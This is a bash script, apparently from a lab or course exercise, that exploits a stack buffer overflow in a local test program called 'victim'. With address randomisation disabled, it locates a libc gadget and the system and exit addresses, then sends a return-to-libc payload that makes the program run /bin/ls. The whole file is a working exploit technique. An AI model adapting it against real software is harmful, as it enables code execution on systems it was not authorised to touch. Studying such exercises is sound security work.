#!/bin/bash

rm -f victim-input
mkfifo victim-input

# libc was at a different location on my Kali compared to lilo
if [ -f "/usr/lib/x86_64-linux-gnu/libc.so.6" ] 
then libcloc=/usr/lib/x86_64-linux-gnu/libc.so.6
else libcloc=/lib/x86_64-linux-gnu/libc.so.6
fi

# grab offsets/addresses
gadget=0x$(xxd -c1 -p $libcloc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}')
system_offset=0x$(nm -D $libcloc | grep '\<system\>' | awk '{print $1}')
exit_offset=0x$(nm -D $libcloc | grep '\<exit\>' | awk '{print $1}')
buffer_addr=$(echo | setarch `arch` -R ./victim | head -n 1)

# start victim in background to grab libc load address
(tail --pid=$BASHPID -f victim-input | setarch `arch` -R ./victim > /dev/null) &
pidc=$!
pidv=$(ps -C victim -o pid --no-headers | tr -d ' ')

libc=0x$(grep libc /proc/$pidv/maps | grep r-xp | awk '{split($0,a,"-"); print a[1]}')

# perform some cleanup
echo > victim-input
kill $pidc
kill $pidv
rm -f victim-input

# run the actual exploit
(echo -n /bin/ls | xxd -p; printf %0514d 0; printf %016x $(($libc+$gadget)) | tac -rs..; printf %016x $buffer_addr | tac -rs..; printf %016x $(($libc+$system_offset)) | tac -rs..; printf %016x $(($libc+$exit_offset)) | tac -rs..) | xxd -r -p | setarch `arch` -R ./victim
